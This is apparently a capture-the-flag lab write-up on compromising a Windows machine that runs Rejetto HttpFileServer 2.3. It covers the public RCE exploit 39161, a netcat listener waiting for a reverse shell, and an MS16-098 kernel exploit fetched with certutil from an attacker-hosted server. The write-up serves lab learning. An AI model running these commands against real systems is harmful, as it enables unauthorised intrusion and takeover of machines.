### Port Scanning and General Enumeration (Nmap)
* Reading/Resources
  * [Nmap manual](https://nmap.org/book/man.html)

Initial scan showed that only port 80 (HTTP) is available

Clicking the link takes us to www.rejetto.com

**What we know:**
- It's running HttpFileServer 2.3
- The vendor is rejetto

### Access (searchsploit, Rejetto HFS RCE)
* Reading/Resources
  * [searchsploit](https://www.exploit-db.com/searchsploit)
  * [RCE](https://www.exploit-db.com/exploits/39161)

Let's see if there's anything on **searchsploit** for `rejetto` or `http file server 2.3`

`searchsploit rejetto`

Let's grab `Remote Command Execution (2)`

`searchsploit -m 39161.py`

`-m` allows us to copy the exploit into our current working directory.

Let's read a bit about what it does

https://www.exploit-db.com/exploits/39161

```
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!
```

So we need to be hosting `nc.exe` on port `80`. That's easy enough. On kali, windows binaries are stored at `/usr/share/windows-binaries`

Now we're going to need a few tabs: 
- On one, our python server (`python3 -m http.server 80`) where `nc.exe` is located
- On another, a listener waiting to catch our shell (`nc -lvnp 4444`)
- And finally, one to fire the exploit

This is what mine looked like after the exploit completed:

### Privesc (Windows Exploit Suggester, MS16-098)
* Reading/Resources
  * [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
  * [MS16-098](https://www.exploit-db.com/exploits/41020)

I ran `winPEAS` on the machine but didn't come back with much so I assume that maybe we're looking at a kernel exploit. Let's try **Windows Exploit Suggester**

Note: for **Windows Exploit Suggester** to work we need to install a specific version of `xlrd`:

`pip2 install --user xlrd==1.1.0`

There's a couple things we need to do before we can run this. 

- First, run it with the `--update` switch. That will write an `xls` file for us to use.
- Second, on the victim machine, use the command `systeminfo` and copy all of the output and save it to a file. I'll name my `systeminfo.txt`
- Now run it:

`python windows-exploit-suggester.py -database 2021-01-25-mssb.xls -systeminfo systeminfo.txt`

Let's look at [MS16-098](https://www.exploit-db.com/exploits/41020). There's a precompiled binary for us to grab on the github page. Let's grab that and transfer it over to the victim machine.

`certutil -urlcache -f Http://10.10.14.18:8000/ms16098.exe ms16098.exe`

Give it a run!
